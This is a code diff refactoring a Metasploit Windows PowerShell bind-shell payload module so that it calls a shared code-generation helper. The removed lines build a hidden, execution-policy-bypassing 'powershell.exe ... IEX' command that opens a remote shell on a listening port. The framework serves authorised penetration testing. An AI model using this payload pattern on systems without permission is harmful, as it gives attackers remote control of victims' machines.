@@ -4,9 +4,11 @@
 ##
 
 require 'msf/core'
-require 'msf/core/handler/bind_tcp'
 require 'msf/core/payload/windows/exec'
+require 'msf/core/payload/windows/powershell'
 require 'msf/base/sessions/powershell'
+require 'msf/core/handler/bind_tcp'
+
 ###
 #
 # Extends the Exec payload to add a new user.
@@ -14,10 +16,11 @@ require 'msf/base/sessions/powershell'
 ###
 module Metasploit3
 
-  CachedSize = 1543
+  CachedSize = 1695
 
   include Msf::Payload::Windows::Exec
   include Rex::Powershell::Command
+  include Msf::Payload::Windows::Powershell
 
   def initialize(info = {})
     super(update_info(info,
@@ -52,33 +55,6 @@ module Metasploit3
   # Override the exec command string
   #
   def command_string
-    lport = datastore['LPORT']
-
-    template_path = ::File.join( Msf::Config.data_directory, 'exploits', 'powershell','powerfun.ps1')
-    script_in = ""
-    ::File.open(template_path, "rb") do |fd|
-      script_in << fd.read(fd.stat.size)
-    end
-
-    script_in = File.read(template_path)
-    script_in << "\npowerfun -Command bind"
-
-    mods = ''
-
-    if datastore['LOAD_MODULES']
-      mods_array = datastore['LOAD_MODULES'].to_s.split(',')
-      mods_array.collect(&:strip)
-      print_status("Loading #{mods_array.count} modules into the interactive PowerShell session")
-      mods_array.each {|m| vprint_good " #{m}"}
-      mods = "\"#{mods_array.join("\",\n\"")}\""
-      script_in << " -Download true\n"
-    end
-
-    script_in.gsub!('MODULES_REPLACE', mods)
-    script_in.gsub!('LPORT_REPLACE', lport.to_s)
-
-    script = Rex::Powershell::Command.compress_script(script_in)
-    "powershell.exe -exec bypass -nop -W hidden -noninteractive IEX $(#{script})"
-
+    generate_powershell_code("Bind")
   end
 end
